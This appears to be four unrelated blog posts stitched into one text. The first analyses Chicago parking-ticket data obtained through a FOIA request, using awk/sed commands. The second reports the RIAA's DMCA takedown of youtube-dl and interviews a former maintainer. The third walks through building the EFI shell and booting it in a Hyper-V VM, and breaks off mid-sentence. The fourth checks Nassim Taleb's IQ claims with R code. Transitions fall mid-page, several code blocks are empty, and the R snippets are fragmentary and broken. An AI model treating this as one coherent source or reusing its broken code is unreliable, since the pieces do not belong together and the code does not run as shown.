<p>This'll be my first blog post on the internet, ever. Hopefully it's interesting and accurate. Please point out any mistakes if you see any!</p>

<p>In 2016, I did some work in trying to find some hotspot areas for parking tickets to see if a bit of data munging could reduce those area's parking tickets. In the end, I only really got one cleaned up, but it was <em>one of</em> the most-ticketed spots in all of Chicago and led to about a 50% reduction in parking tickets.</p>

<p>Here's a bit of that story.</p>

<h3>Getting the data through FOIA:</h3>

<p>The system Chicago uses to store its parking tickets is called CANVAS. It's short for "City of Chicago Violation, Noticing and Adjudication Business Process And System Support" [sic] and managed by IBM.  Its most recent contract started in 2012, expires in 2022, and has a pricetag of over $190 million.</p>

<p>Most of Chicago's contracts and their Requests For Procurement (RFP) PDFs are published online. In CANVAS's contracts it gives a fair amount of info on CANVAS's backend infrastructure, including the fact that it uses Oracle 10g. In other words, a FOIA request can be fulfilled by IBM running some simple SQL. </p>

<p><a href="https://www.cityofchicago.org/content/dam/city/depts/dps/ContractAdministration/Specs/2011/Spec92488II.pdf">CANVAS Technical Spec</a>
<br><a href="https://data.cityofchicago.org/Administration-Finance/CANVAS/sbf2-65yk/data">CANVAS Contract</a>
<br><a href="http://ecm.cityofchicago.org/eSMARTContracts/service/DPSWebDocumentViewer?id={C8B55BB4-16F1-4941-B140-CAEA322CFFCD}&amp;osName=eContentContracts&amp;el=0&amp;image=image">CANVAS Request For Procurement (RFP) and Contract</a></p>

<p>With that information at hand, and a couple failed FOIA requests later, I sent this request to get the parking ticket data from Jan 1, 2009 to Mar 10, 2016:</p>

<p><em>"Please provide to me all possible information on all parking tickets between 2009 and the present day. This should include any information related to the car (make, etc), license plate, ticket, ticketer, ticket reason(s), financial information (paid, etc), court information (contested, etc), situational (eg, time, location), and photos/videos.  Ideally, this should also include any relevant ticket-related information stored within CANVAS.</em></p>

<p><em>[...]</em></p>

<p><em>This information will be used for data analysis for research.</em></p>

<p><em>Thanks in advance,</em></p>

<p><em>Matt Chapman"</em></p>

<h3>Data</h3>
<p>About a month later, a guy named Carl (in a fancy suit), handed me a CD with some <em>extremely</em> messy data in a semicolon delimited file named <code>A50462_TcktsIssdSince2009.txt</code>. The file had info on 17,806,818 parking tickets and spans from Jan 1, 2009 to Mar 10, 2016.</p>

<p>The data itself looks like this:</p>

<pre><code>head -5 A50462_TcktsIssdSince2009.txt

</code></pre>

<h4>Some things to note about the data:</h4>

<ol>
<li>The file is semicolon delimited.</li>
<li>Each address is hand typed on a handheld device, often with gloves.</li>
<li>There are <em>millions</em> of typos in the address column. Including over 50,000 semicolons!</li>
<li>There is no lat/lon.</li>
</ol>

<p>What that amounts to is an extremely, extremely messy and unpredictable dataset that's incredibly to difficult to accurately map to lat/lon, which is needed for any sort of comprehensive GIS analysis.  There are a bunch of geocoder services that can help out here, but most of them have about a 50% accuracy rate. That said, with the help of a bit of scrubbing, that number can be boosted to closer to 90%. Another post for another time.</p>

<p>Here’s a sample list of Lake Shore Drive typos:</p>

<pre><code>Laks Shore Dr
Lawkeshore Dr West
Lkaeshore Dr
Lkae Shore Dr
Lkae Shore Drive
Lkaeshore Dr West
</code></pre>

<h3>Original Analysis</h3>

<p>I was particularly interested in finding areas that had hotspot areas that stood out. A lot of my time was spent just throwing hacky code at the problem and eventually wrote out two series of (hacky) commands that led to identifying a potentially fixable spot.</p>

<p>Originally, the work and analysis I was doing was with a combination of unix commands and gnuplot. Since then, I've migrated my code to python + matplotlib + SQL. But, for the sake of this blog, I wanted to show the original analysis.</p>

<p>Get count of tickets at addresses and ignoring first two digits:</p>

<pre><code>$ mawk -F';' '{print $7}' all_tickets.orig.txt
    | sed -r 's/^([0-9]*)[0-9][0-9] (.*)/\100 \2/'
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort | uniq -c | sort -nr

  79320 1900 W OGDEN
  <b>60059 1100 N STATE</b>
  50594 100 N WABASH

  43030 2800 N BROADWAY
  42294 2100 S ARCHER
  42116 1900 W HARRISON
</code></pre>

<p>Get count of tickets, by ticket type, at specific addresses:</p>

<pre><code>$ mawk -F';' '{print $9,$7}' A50462_TcktsIssdSince2009.txt
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort --parallel=4 | uniq -c | sort -nr

</code></pre>

<p>Both bits of code roughly show that there's something going on at 1100N state street, and 1166 N State St looks particularly suspicious..</p>

<p>So, have a look at the original set of signs:</p>

<center><img src="https://mchap.io/assets/2016signs.png"></center>

<p>Things going on that make this spot confusing:</p>

<ol>
<li>This is a taxi stand from 7pm to 5am for three cars’ lengths. Parking in a taxi stand is a $100 ticket.</li>
<li>When this spot isn’t a taxi stand, it’s metered parking – for a parking meter beyond an alleyway.</li>
<li><a href="https://mchap.io/assets/parkingreceipt.jpg">It’s possible to pay for parking here after 7pm</a>, which makes it look like parking is acceptable – especially with the “ParkChicago” sign floating there.</li>
<li>Confusion creates more confusion – if one car parks there, then more cars follow. Cha-ching.</li>
</ol>

<h3>Contacting the 2nd Ward</h3>

<p>With all that in mind, I contacted the second ward’s alderman’s office on April 12 explaining this, and got back this response:</p>

<p><em>"Hello Matt,</em></p>

<p><em>[…]The signs and the ordinance are currently being investigated.</em></p>

<p><em>In the interim, I highly recommend that you do not park there to avoid any further tickets.</em></p>

<p><em>Lisa&nbsp;Ryan</em></p>

<p><em>Alderman Brian Hopkins - 2nd&nbsp;Ward"</em></p>

<h3>The Fix</h3>

<p>On 1/11/17 I received this email from Lisa:</p>

<p><em>"Matt,</em></p>

<p><em>I don't know if you noticed the additional&nbsp;signage installed&nbsp;on State Street at the 3 Taxi Stand.</em></p>

<p><em>This should elevate [sic] any further confusion of vehicle parking.</em></p>

<p><em>Thank you for your patience.</em></p>

<p><em>Lisa Ryan"</em></p>

<p>Sure enough, two new signs were added!</p>

<center><img src="https://mchap.io/assets/new_signs.png"></center>

<p>The new taxi stand sign sets a boundary for a previously unbounded taxi stand. The No Parking sign explicitly makes it clear that parking here during taxi stand hours is a fineable offense. Neat!</p>

<p>And then there's this guy:
</p><center><img src="https://mchap.io/assets/thisguy.png"></center>

<h3>Results</h3>

<p>I recently decided to look at the number of tickets at that spot. Armed with a new set of data from another FOIA request, I did some analysis with python, pandas, and SQL. What I found is that the addition of a new sign effectively led to a 50% reduction in parking tickets between 1150 and 1200 N State St. Adding it all up, that's about 400 tickets fewer in 2017 and 200 so far in 2018 compared to 2016. All in all, that's about $60,000 worth in parking tickets!</p>

<p>The drop in slope to about 50% matches perfectly with Lisa’s email:</p>

<p>And then comparing 2016 to 2017:

<h3>What's next?</h3>

<p>All in all, the number of parking tickets is going up in Chicago, and this work shows that <em>something</em> can be done, even if small.</p>

<p>This work is only on one small section of road, but I'm convinced that similar work can be on a systematic scale. It's mostly just a matter of digging through data and working directly with each ward.</p>

<p>The later analysis done here was also only done on the most recent dataset that the Department of Revenue they gave me. The two datasets have a different set of columns, so the two datasets need to be combined still. I hope to accomplish that soon! </p>

                    <p><br>Friday night on the 23<sup>rd</sup> of October the ‘Recording Industry Association of America, Inc. (RIAA)’ sent a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA request </a>to GitHub asking that the popular YouTube downloading software ‘youtube-dl’ be taken down. GitHub responded as by immediately removing the repositories and 17 forked pieces of software from it’s site.</p><figure><img src="https://news.perthchat.org/content/images/2020/10/Screener.png" alt="" srcset="https://news.perthchat.org/content/images/size/w600/2020/10/Screener.png 600w, https://news.perthchat.org/content/images/size/w1000/2020/10/Screener.png 1000w, https://news.perthchat.org/content/images/2020/10/Screener.png 1405w" sizes="(min-width: 720px) 720px"></figure><p>Most DMCA notices are regarding the unauthorised distribution of a particular piece of media, and they request that a media be taken down. This DMCA notice was different since it’s targeting tools that can be used to reproduce copyrighted media.</p><p>Youtube-DL is licensed under the <a href="https://en.wikipedia.org/wiki/Unlicense">Unlicense</a>, an anti-copyright license that promises ownership of the software to the public domain. As such it is usually considered lawful to freely distribute the software itself. There are many other places you can find copies of this software besides the current maintainers GitHub page.</p><div><p>The notice claimed the youtube-dl software was a ‘Anticircumvention Violation’ as well as a violation of YouTube’s terms of service. It requested that:</p><p><em>“In light of the above noted copyright infringements and anticircumvention violations, we ask that you immediately take down and disable access to the youtube-dl source code at all of its locations where it is hosted on GitHub, including without limitation those locations in the representative list set forth above.”</em></p></div><p>It also draws attention to the examples featured in the youtube-dl source code which include examples of how to download copyrighted music from Icona Pop, Justin Timberlake and Taylor Swift. The notice also claimed that:</p><p><em>“The clear purpose of this source code is to (i) circumvent the technological protection measures used by authorised streaming services such as YouTube, and (ii) reproduce and distribute music videos and sound recordings owned by our member companies without authorization for such use.”</em></p><p>Although the youtube-dl software cannot be used to distribute music, only to reproduce it. It’s also possible to use youtube-dl to reproduce public domain or creative commons work that people do have the right to copy and redistribute.</p><p>For now the software remains widely distributed and used. It can still be accessed through the <a href="https://yt-dl.org/download.html">existing yt-dl.org website.</a> Last year the RIAA was <a href="https://torrentfreak.com/riaa-delists-youtube-rippers-from-google-using-rare-anti-circumvention-notices-191108/">able to get 5 YouTube ‘ripper’ sites removed from the Google search engine.</a></p><figure><img src="https://news.perthchat.org/content/images/2020/10/Screener-1.png" alt="" srcset="https://news.perthchat.org/content/images/size/w600/2020/10/Screener-1.png 600w, https://news.perthchat.org/content/images/size/w1000/2020/10/Screener-1.png 1000w, https://news.perthchat.org/content/images/2020/10/Screener-1.png 1366w" sizes="(min-width: 720px) 720px"></figure><h3 id="perthchat-news-interview-with-philipp-hagemeister">Perthchat News Interview With Philipp Hagemeister</h3><p><br>I reached out to previous maintainer Phillip Hagemeister, who had this to say about the incident:</p><p><strong>Are you worried you will see any personal damages from this?</strong></p><blockquote>I received a seize and desist letter from German lawyers a couple of weeks ago. However, there are a number of technical inaccuracies in that letter; in particular the lawyers did not seem to have understood that my maintainership of youtube-dl ended years ago. Since this is an ongoing legal issue, that's all I'll say about that.</blockquote><p><strong>Are you going to change the examples in the source code and remove references to the copyrighted works of Icona Pop, Justin Timberlake and Taylor Swift?</strong></p><blockquote>I am no longer involved in the youtube-dl project, but if I were:</blockquote><blockquote>I would remove the test cases. These videos were never fully downloaded anyways; they are automated test cases where the test just downloads the first 10KB, which amounts to a couple of seconds at most. This is certainly fair use, but the project is fully functional without these test cases.</blockquote><blockquote>I would remove the referenced code, even though I believe it to be legal. It's an extremely small part of youtube-dl (which despite the name supports over 1000 other sites apart from YouTube) and not worth the trouble for me. I respect those who argue that the code should remain unchanged though, or that only music videos should be excluded.</blockquote><p><strong>Do you have any other comments about the incident?</strong></p><blockquote>youtube-dl is very valuable for many purposes: It enables video playback on devices where the web interface is not suitable (e.g. Raspberry Pis), it allows playback for disabled users, it powers research projects which analyze videos, and you can just watch videos when there may be no stable Internet connection. This should be unequivocally allowed and even supported for the good of society, while keeping the ability of content producers to benefit from their creations.</blockquote><blockquote>In my time as maintainer, I declined numerous requests to support piracy sites and DRM-protected content. I can not speak for the project in the last years, but from what I've seen that policy has remained. To me, this is the right policy any legal project should follow.</blockquote><blockquote>In some locations, judges seem to have interpreted the law to be something it does not say. It should be clarified – whether by judges or lawmakers – to what is written down already and was intended: Proper DRM should not be subverted except for archiving purposes, but anything else is clearly allowed. Personally, I would go so far to require DRM schemes to decode timestamp and licenses to enable archiving. That's not to say I think that DRM subversion should be illegal in the first place, but that's a political rather than a legal issue.</blockquote><blockquote>GitHub is in no way to blame. They hosted the project for free, and we should thank them for that. I can understand that some people don't want to deal with the RIAA – maybe they are not even located in the US – and simply move the source code somewhere else, but I greatly appreciate GitHub's services and support. I hope they can work with future maintainer of youtube-dl to get the project back on GitHub.</blockquote><blockquote>My thanks go to everybody who has contributed so far to youtube-dl, but especially to the current maintainer Sergey. I hope somebody takes up the flag, source code, and distribution of youtube-dl, but I understand if Sergey doesn't want to deal with all of this trouble. Due to other personal &amp; open-source commitments as well as the ongoing legal affairs, I'm sad it can't be me. I wish the project all the best.</blockquote><blockquote>Copyright law is always a balance between creators and society. When it comes to being able to watch videos no matter the device or Internet connection, and doing so for non-commercial purposes, the balance we should strive for seems clear to me; it should allow youtube-dl.</blockquote>

	<section>

<p>Some people may think some of my past posts get into the weeds, exploring the technical depths of Windows Autopilot, Intune, Windows 10, ConfigMgr, etc.&nbsp; But I would say those generally only get to the 300-level – I will leave out the really deep stuff because it can be harder to explain, and some people just might not care.&nbsp; But every so often, in an effort to maintain my sanity, I like to dive into a new topic to prove that I am still capable of learning new stuff and spending more than 30 minutes on said topic.&nbsp; And in this case, anyone reading this blog post will be coming along for the ride.&nbsp; We’ll see how many people make it all the way to the “end of the road.”</p>



<p>So what’s the topic?&nbsp; Something that I <a href="https://blogs.technet.microsoft.com/mniehaus/2011/06/10/mdt-2012-beta-1-uefi-support/" target="_blank">started talking about almost 10 years ago</a>, the Unified Extensible Firmware Interface (UEFI).&nbsp; Back then, it was more of a warning:&nbsp; The way you deploy Windows is going to change.&nbsp; Now, it’s a way of life (and fortunately, it no longer sucks like it did back in 2010 when we first started working with it).</p>



<p>I don’t want to rehash the “why’s” behind UEFI because frankly, you no longer have much of a choice:&nbsp; All new Windows 10 devices ship with UEFI enabled by default (and if you are turning it off, shame on you).&nbsp; Instead, I want to focus much more on how it works and what’s going on behind the scenes.</p>



<h3>Chapter 1: The boot process</h3>



<p>According to <a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_8_final.pdf" target="_blank">the UEFI spec</a> (which is a really hard to follow document), a device will initially start up and look for a particular file based on the architecture of the system:</p>



<figure><table><tbody><tr><td>Architecture</td><td>File</td></tr><tr><td>x86 (32-bit)</td><td>bootia32.efi</td></tr><tr><td>x64 (64-bit)</td><td>bootx64.efi</td></tr><tr><td>ARM (32-bit)</td><td>bootarm.efi</td></tr><tr><td>ARM (64-bit)</td><td>bootaa64.efi</td></tr></tbody></table></figure>



<p>It will look in the \EFI\BOOT folder on accessible FAT32 volumes for this file.&nbsp; (The firmware can only read FAT32 file systems.&nbsp; GPT disks are suggested, although interestingly enough MBR disks would probably work too, at least per the UEFI spec.)&nbsp; That’s effectively a fallback mechanism – if nothing else loaded, search out something.&nbsp; But once you’ve installed an OS on the device, it will create firmware entries that provide alternative choices; UEFI will work its way down the list until it successfully loads one.&nbsp; Here’s what you would see for that firmware order on a Hyper-V VM that’s already running Windows 10:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb.png" alt="image"></a></figure>



<p>Notice that the first entry in the list points to \EFI\Microsoft\Boot\bootmgfw.efi, the Microsoft-provided boot manager; it then decided what OS to boot from the BCD.&nbsp; An interesting fact:&nbsp; If you look at the bootmgfw.efi file and compare it against the bootx64.efi file (you’ll have to assign a drive letter to the EFI partition to see these files), you’ll notice that they are exactly the same size:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-1.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-1.png" alt="image"></a></figure>



<p>That’s not a coincidence – they are actually the exact same file.&nbsp; So whether it’s loaded as a “last resort” by the firmware (bootx64.efi) or by the explicit firmware entry doesn’t matter, it does the same thing either way.&nbsp; </p>



<p>The boot manager will then boot an OS based on the BCD entries.&nbsp; For a Windows 10 OS, there will be an entry in the BCD that points to a particular volume as well as the path of the Windows boot loader that actually boots the OS, which is typically \windows\system32\winload.efi on that volume.&nbsp; Here’s the entry from my laptop:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-2.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-2.png" alt="image"></a></figure>



<p>Behind the scenes, that “partition=c:” entry really points to the ID of the volume (since drive letter assignments depend on the OS mappings, not the BCD or loader); BCDEDIT is making it more friendly.&nbsp; When winload.efi is loaded, it will find the actual Windows kernel and load it, which starts the actual OS boot process.</p>



<p>There’s one other interesting file that can come into play, hvloader.efi.&nbsp; This one is tied to the “hypervisorlaunchtype” BCD setting about.&nbsp; This one is for the Hyper-V hypervisor.&nbsp; The winload.efi boot loader will check this setting and automatically load hvloader.efi to launch the hypervisor.&nbsp; The exact mechanism for that isn’t 100% clear to me – that was a rabbit hole I didn’t want to go down.&nbsp; </p>



<p>One other point worth mentioning in this process:&nbsp; If secure boot is enabled, all of the mentioned files will be checked to make sure that they are properly signed and unmodified.&nbsp; If the boot process gets far enough for the NTOS kernel to run, it will also perform verification of critical boot files.&nbsp; This is a key UEFI and Windows security feature, and why you should always run with UEFI and Secure Boot enabled, except when testing or playing (and we’ll do plenty of that later).</p>



<h3>Chapter 2: What are these EFI files anyway?</h3>



<p>I remember reading in the UEFI specifications a long time ago that UEFI used <a href="https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface" target="_blank">“EFI byte code” (EBC)</a>.&nbsp; That would mean special tools, compilers, etc.&nbsp; Well, I was wrong.&nbsp; Yes, such a thing exists, but it’s primarily for cross-platform drivers, and apparently is not used very often.&nbsp; So these EFI files (like bootmgfw.efi) are just typical executables, and can be written in any language and compiled into something that’s pretty close to a standard binary.&nbsp; C and assembly language are the most common languages used, and both are used in the <a href="https://github.com/tianocore/edk2" target="_blank">source code for UEFI itself</a> (the EDK2 repository, part of the <a href="https://www.tianocore.org/" target="_blank">Tianocore project</a>).</p>



<p>At the moment at least, my interest isn’t in writing UEFI code.&nbsp; But there is one piece of UEFI code that would come in very handy to explore some of the “behind the scenes” operations of UEFI: the EFI shell.&nbsp; Think of this as a sort of “UEFI command prompt” that has a number of built-in commands for working with UEFI itself.&nbsp; The source code is included in the EDK2 project, it just needs to be built (compiled/linked).</p>



<p>OK, so how to build it?&nbsp; There are <a href="https://github.com/tianocore/tianocore.github.io/wiki/Windows-systems" target="_blank">some instructions in the Tianocore Github content</a>.&nbsp; Those instructions are OK, but not perfect.&nbsp; Here’s a high-level summary of what I did:</p>



<ul><li>Install Visual Studio 2019 (even though it isn’t listed as officially supported in the EDK2 documentation – that stops at Visual Studio 2017).&nbsp; Make sure you install the desktop development tools.&nbsp; (I included MSVC v141, which is the VS2017 version.&nbsp; I think that was necessary, just didn’t take the time to prove it.)</li><li>Install <a href="https://www.python.org/" target="_blank">Python 3.7</a> or later to C:\Program Files\Python37.&nbsp; Set a system environment variable PYTHON_HOME to “C:\Program Files\Python37” (without the quotes, without a trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Nasm-Setup" target="_blank">NASM open-source assembly compiler</a> to C:\Program Files\NASM.&nbsp; Set a system environment variable NASM_PREFIX to “C:\Program Files\NASM\” (without the quotes, with the trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Asl-Setup" target="_blank">ASL compiler</a> to C:\ASL</li><li>Install <a href="http://git-scm.com/download/win" target="_blank">Git GUI</a>.&nbsp; </li><li>Clone the EDK2 repository from Git GUI, specifying a source location of <a title="https://github.com/tianocore/edk2.git" href="https://github.com/tianocore/edk2.git">https://github.com/tianocore/edk2.git</a> and a target of C:\EDK2.</li><li>Edit the “C:\EDK2\Conf\target.txt” file to specify the following values:
<p>ACTIVE_PLATFORM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = MdeModulePkg/MdeModulePkg.dsc<br>TARGET_ARCH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = X64</p></li></ul>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat Rebuild”.</li><li>Run “build”.</li></ul>



<p>If all of that works, you should then have a full build of the main UEFI code.&nbsp; But you still won’t have the UEFI shell.&nbsp; So a little more is required:</p>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat”.</li><li>Run “build -p ShellPkg\ShellPkg.dsc”</li></ul>



<p>After doing that, you should find the resulting shell.efi file in C:\EDK2\Build\Shell\DEBUG_VS2017\X64\ShellPkg\Application\Shell\Shell\DEBUG.&nbsp; Now, let’s try to use it…</p>



<h3>Chapter 3: Booting to the EFI shell </h3>



<p>Let’s start off with something really simple:&nbsp; A brand-new VM with no operating system on it.&nbsp; Based on the previous discussions, all we should need to do is create a FAT32 disk, place the EFI file in the right place, and then boot.&nbsp; So let’s try it.&nbsp; Here are the steps:</p>



<ul><li>Create a new VM in Hyper-V (4GB RAM, a small expanding VHDX, gen 2, two processors – typical stuff).&nbsp; Don’t start it yet.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-3.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-3.png" alt="image"></a></figure>



<ul><li>Find the VHDX file in File Explorer and double-click it to mount it.&nbsp; You’ll get a message like this:</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-4.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-4.png" alt="image"></a></figure>



<ul><li>Do as it says: Open Disk Management, initialize the disk, and then create a small FAT32 partition.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-5.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-5.png" alt="image"></a></figure>



<ul><li>It should look like this (the E: drive):</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-6.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-6.png" alt="image"></a></figure>



<ul><li>Navigate to the drive (E: from my example) in File Explorer.&nbsp; Create an E:\EFI\BOOT folder structure, then copy the shell.efi file into it, renaming it to bootx64.efi (remember that from above?).</li></ul>



<blockquote><p> Directory of e:\EFI\BOOT</p><p>09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<br>
09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ..<br>
09/01/2019&nbsp; 12:31 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bootx64.efi<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bytes</p></blockquote>



<p>Right-click on the drive (e.g. E:\) in File Explorer and eject it (which unmounts it).</p>



<p>Now you can start the VM – and see it fail with an error like this:</p>

<p>That’s actually a good sign: The UEFI firmware attempted to load the EFI shell (shell.efi renamed to bootx64.efi), but it failed.&nbsp; Any guesses as to why from the error message on the screen, “unsigned image’s hash is not allowed”?&nbsp; Simple, it’s a Secure Boot error.&nbsp; The EFI executable isn’t signed by Microsoft – actually it isn’t signed at all.&nbsp; So to get it to run, we need to turn off Secure Boot.&nbsp; Turn off the VM and change the setting:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-8.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-8.png" alt="image"></a></figure>



<p>Apply the change, then start the VM again.&nbsp; Now we see something much better:</p>

<p>As you can see in that output, the device is running UEFI shell 2.2 (the most recent version of the spec), UEFI 2.7 (pretty recent, there is a 2.8 version now), and Microsoft is the vendor (as expected in Hyper-V).&nbsp; If you look at a directory of the FS0: volume:</p>

<p>You can see that it is the FAT32 volume that we prepared before, with the renamed shell.efi loaded by the virtual machine automatically.</p>



<p>See page 92 of <a href="https://uefi.org/sites/default/files/resources/UEFI_Shell_2_2.pdf" target="_blank">the UEFI Shell 2.2 spec</a> for all the commands that are accepted.&nbsp; The one that I am most interested in is “dmpstore” because it will dump out all of the UEFI variables.&nbsp; You can specify that you want all variables (-all), and that you want to page through them on the screen (-b, useful to see the names on the screen).&nbsp; Here’s an example from …</p></section></article></div>

<h3 id="introduction">Introduction</h3>
<p>In this post I look into the document by Nassim Taleb: <a href="https://medium.com/incerto/iq-is-largely-a-pseudoscientific-swindle-f131c101ba39">IQ is largely a pseudoscientific swindle</a>. Most of the document is just a rant, but he does make some quantitative claims, which is good. I investigate the veracity of these claims using real data.</p>
<p>[Edit: The quotes below were taken verbatim from Taleb’s document as it was written when this post was uploaded.]</p>

<h3 id="variance-explained-by-iq">Variance explained by IQ</h3>
<p>Claim:</p>
<blockquote>
<p>[IQ] explains at best between 2 and 13% of the performance in some tasks</p>
</blockquote>
<p>I already have prepared the <a href="https://www.ssc.wisc.edu/wlsresearch">WLS</a> data set <a href="http://jsmp.dk/files/wls_data.html">here</a>, and it has a good IQ test, so I will use that. Lets look at the regression of grades on IQ.</p>
<div data-layout="l-body">

</div>
<p>The adjusted R<sup>2</sup> is 0.356, so IQ explains ~35% of the variance of grades in this data set. Taleb defenders may say that things such as school grades don’t matter in real life. But whatever your position on this, the situation is that he made a specific claim about how much IQ explains <em>at best</em>, which was off by a large factor.</p>

<h3 id="iq-selection-vs-random-selection">IQ selection vs random selection</h3>
<p>Claim:</p>
<blockquote>
<p>Turns out IQ beats random selection in the best of applications by less than 6%</p>
</blockquote>
<p>He hasn’t specified what exactly he means by this. But I’m pretty sure he is thinking of a comparison like the one he talks about in this tweet:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/puzzle.jpg" width="300px"></p>

<p>So I will analyze something this, a stylized example with assumptions similar to these. In the real world, you will likely have other information that complicates this picture, such as education credentials; but we ignore that for now.</p>
<p>I create two normally distributed variables, with correlation 0.5, and call them IQ and performance.</p>
<div data-layout="l-body">

                 2,2))

df &lt;- tibble(IQ = X0[,1], 
             performance = X0[,2])

df %&gt;% summarise(
  cor = cor(IQ, performance), 
  n = n(),

  mean_performance = mean(performance),
  sd_performance = sd(performance)

</div>

<p>The probability of hiring an employee with above average performance, if you hire an employee with above average IQ is:</p>
<div data-layout="l-body">
<pre><code>
above_average_iq &lt;- df %&gt;% filter(IQ &gt; 0)

nrow(above_average_iq %&gt;% filter(performance &gt; 0)) / nrow(above_average_iq)
</code></pre>
<p><em>0.667</em></p>
</div>

<p>The probability if there was 0 correlation is of course 0.5. So using IQ as a criteria beats random selection by 16.67% (as Taleb also found). This is a little more than 6%, but that is a detail. More importantly, this example is a theoretical use case where using IQ testing is not so useful. To look at something a little more realistic, let’s say a company wants to avoid people with a performance more than 2 standard deviations below the mean. (Perhaps such employees have a risk of causing large harm, which could for instance be an issue in <a href="https://quillette.com/2018/08/25/the-dangers-of-ignoring-cognitive-inequality/">the military</a>.) And we again compare admitting people at random vs only taking applicants with above average IQ.</p>
<p>If the company admits people at random, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection &lt;- 
  nrow(filter(df, performance &lt; -2)) / n

bad_performance_w_random_selection
</code></pre>
<p><em>0.0228</em></p>
</div>

<p>And if the company only takes applicants with above average IQ, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_iq_criteria &lt;- 
  nrow(filter(above_average_iq, performance &lt; -2)) / 
  nrow(above_average_iq)

bad_performance_w_iq_criteria
</code></pre>
<p><em>0.00406</em></p>
</div>

<p>This is an improvement by a factor of:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection / bad_performance_w_iq_criteria
</code></pre>
<p><em>5.6</em></p>
</div>

<p>In other words, using IQ selection criteria in this case beats random selection by more than 450%. Quite different than the claimed 6%.</p>

<h3 id="iq-and-income">IQ and income</h3>
<p>Claim:</p>
<blockquote>
<p>There is no correlation IQ/Income above 45K</p>
</blockquote>
<p>He makes this claim based on this image:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqincome.png" width="450px"></p>
<p>The image is from <a href="https://psycnet.apa.org/record/2007-12577-007">this paper</a>, which gets its data from <a href="https://www.bls.gov/nls/nlsy79.htm">NLSY79</a>. This data is also public, so we can again check for ourselves. Description of the preprocessing I perform is described <a href="http://www.jsmp.dk/files/nlsy_data.html">here</a>.</p>

<p>The plot looks similar to the one from the paper, but somewhat different, because I use the average income values for a period of 10 years, instead of that from a single year.</p>
<div data-layout="l-body">

    breaks = c(100000, 200000, 300000, 400000, 500000),

<p>As in the plot used by Taleb it’s quite hard to see whats going on with all the overlying points. Reducing the transparency helps somewhat.</p>
<div data-layout="l-body">

<summary>plot with reduced transparency</summary>

<p>If we look at only incomes above $45.000 per year, there is still a clear correlation of about 0.3.</p>
<div data-layout="l-body">

<p>Another way to make the relationship clearer is to plot the distribution of income for seperate IQ groups. Plotting the distribution avoids the issue of the plot becoming unclear and confusing due to overlapping points.</p>
<p>The plot below again plots only people with income above $45k per year. The difference IQ makes is clear, both in the median value, and the length of the tails.</p>

<h3 id="iq-and-fat-tails">IQ and fat tails</h3>
<blockquote>
<p>[The income data] truncates the big upside, so we not even seeing the effect of fat tails</p>
</blockquote>
<p>It is correct that in the presence of fat tails the correlation is uninformational in predicting expected income. And the data from these studies does not give good information about such tails. However, it is highly possible that the effect of IQ is even more impactful in the tails, rather than less. For example, Bill Gates and Paul Allen scores 1590/1600 on their SATs, which for SATs at that time meant extremely high IQs. Since Bill Gates is also in the tail of wealth and income, this indicates that the overall impact of people in the tails is to accentuate rather than diminish the importance of IQ.</p>

<h3 id="correlation-only-for-low-iq">Correlation only for low IQ</h3>
<blockquote>
<p>IQ mostly measures extreme unintelligence</p>
</blockquote>
<p>He claims that IQ has high correlation with traits at low IQ, but that this correlation falls drastically at above median IQ, as illustrated in this figure from the post:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqcor2.png" width="300px"></p>
